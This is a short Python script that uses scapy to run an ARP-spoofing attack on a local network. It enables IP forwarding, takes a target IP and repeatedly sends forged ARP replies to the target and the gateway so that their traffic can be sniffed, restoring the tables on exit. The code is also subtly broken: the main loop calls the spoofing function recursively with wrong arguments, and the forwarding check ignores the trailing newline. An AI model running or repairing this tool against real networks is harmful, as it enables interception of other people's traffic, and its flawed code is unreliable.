import os
import time

from scan import local_ip, gateway_ip, mac_ip_list
import scapy.all as scapy


def check_ip_forwarding():
    if os.popen("cat /proc/sys/net/ipv4/ip_forward").read() == '1':
        return True
    else:
        return False


def ip_forwarding(num):
    os.system(f"echo {num} > /proc/sys/net/ipv4/ip_forward")


def get_mac_by_ip(ip):
    for i in range(len(mac_ip_list)):
        if mac_ip_list[i][0] == ip:
            return mac_ip_list[i]
    return False


def send_arp_pack(target_ip_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip_mac[0], hwdst=target_ip_mac[1], psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp_table(target_ip_mac, spoof_ip_mac):
    packet = scapy.ARP(op=2, pdst=target_ip_mac[0], hwdst=target_ip_mac[1],
                       psrc=spoof_ip_mac[0], hwsrc=spoof_ip_mac[1])
    scapy.send(packet, count=4, verbose=False)



def arp_spoof():
    
    print("----- Enter target IP -----")
    target_ip = input("---> ")

    if not check_ip_forwarding():
        ip_forwarding(1)

    target_ip_mac = get_mac_by_ip(target_ip)
    spoof_ip_mac = get_mac_by_ip(gateway_ip)

    packet_count = 0

    try:


        while True:
            arp_spoof(target_ip_mac, spoof_ip_mac)
            arp_spoof(spoof_ip_mac, target_ip_mac)
            packet_count += 2
            print(f"----- Send {packet_count} packets -----")
            print("----- SNIFF PLSSS -----")
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp_table(target_ip_mac, spoof_ip_mac)
        restore_arp_table(spoof_ip_mac, target_ip_mac)
        print("----- Arp tables have restored ! ----- ")

